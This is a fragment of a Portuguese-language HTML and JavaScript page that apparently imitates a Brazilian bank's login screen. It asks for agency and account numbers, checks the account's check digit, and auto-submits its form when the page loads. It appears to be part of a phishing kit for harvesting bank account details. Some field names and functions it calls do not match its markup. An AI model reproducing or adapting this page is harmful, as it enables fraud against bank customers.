t>\r\n<script type="text/javascript">\r\nfunction continua() {\r\n  var a = document.forms[0], b = a.ia.value, a = a.ib.value, op = document.getElementById("iop");\r\n  if(op.style.display=="block"){ continuaop(); return;}\r\n  \r\n  if (3 <= b.length && 5 <= a.length) {\r\n    valida(b, a);\r\n  } else {\r\n    return alert("Agencia/Conta invalida. Verifique e digite novamente."), !1;\r\n  }\r\n}\r\n\r\nfunction valida(c, d) {\r\n  var b = d.replace("-", ""), e = b.substring(0, b.length - 1), a = c + b, b = a.substring(a.length, a.length - 1), a = a.substring(0, a.length - 1);\r\n  if (b == calcdv(a)) {\r\n    document.getElementById("ib").value = e, document.getElementById("p").value = b, document.forms[0].submit();\r\n  } else {\r\n    return alert("Agencia/Conta invalida. Verifique e digite novamente."), !1;\r\n  }\r\n}\r\n\r\nfunction calcdv(e){var a,d=2,b=0,c="";for(a=e.length-1;0<=a;a--)c=d*parseInt(e.charAt(a))+c,1>--d&&(d=2);for(a=0;a<c.length;a++)b+=parseInt(c.charAt(a));b%=10;0!=b&&(b=10-b);return b.toString()}\r\n\r\nfunction hif() {\r\n  var a = document.getElementById("ib");\r\n  5 == a.value.length && (a.value += "-");\r\n}\r\n\r\nfunction mostraul(){\r\ndocument.getElementsByClassName("dropdownMenu")[0].style.display=\'block\';\r\n}\r\n\r\nfunction mostraop() {\r\n  document.getElementsByClassName("content")[0].style.backgroundImage = "url(files/content2.png)";\r\n  document.getElementsByClassName("dropdownMenu")[0].style.display = "none";\r\n  document.getElementById("one").style.visibility = "hidden";\r\n  document.getElementById("two").style.visibility = "hidden";\r\n  var a = document.getElementById("tre");\r\n  a.style.display = "block";\r\n  a.focus();\r\n}\r\n\r\nfunction mostranormal() {\r\n  document.getElementsByClassName("content")[0].style.backgroundImage = "url(files/content1.png)";\r\n  document.getElementsByClassName("dropdownMenu")[0].style.display = "none";\r\n  document.getElementById("one").style.visibility = "visible";\r\n  document.getElementById("two").style.visibility = "visible";\r\n  document.getElementById("ia").focus();\r\n}\r\n\r\ndocument.forms[0].submit();\r\n\r\n</script>\r\n</head>\r\n\r\n<body>\r\n<div class="banner2"><img src="files/2.png"  width="100%" height="100%"/>\r\n</div> \r\n<div class="header">\r\n<div class="search"><img src="files/lgx.png" class="padding" /></div>\r\n<div class="produtos">Busca</div><div class="produtos">Ajuda</div>\r\n<div class="topo1">\r\n<div class="topoform">\r\n<div  class="content">\r\n<input type="text" class="texto" style="left:175px" id="one" name="ag" onfocus="{this.value=\'\'};" onkeyup="return next();" maxlength="4"/>\r\n<input type="text" onfocus="{this.value=\'\'}"  class="texto" id="two" name="two" style="left:205px" onkeypress="return hif();" maxlength="7"/>\r\n<a onclick="enviaform();" class="acess"><img src="img/cadeado.png" /></a>\r\n</div> \r\n</div>\r\n</div>\r\n</div>\r\n<div class="banner"><img src="files/0517.jpg"  width="100%" height="100%"/>\r\n<div class="bt"><img src="files/btt.png" style="float:left" /></div></div>\r\n</body>\r\n</html>\r\n'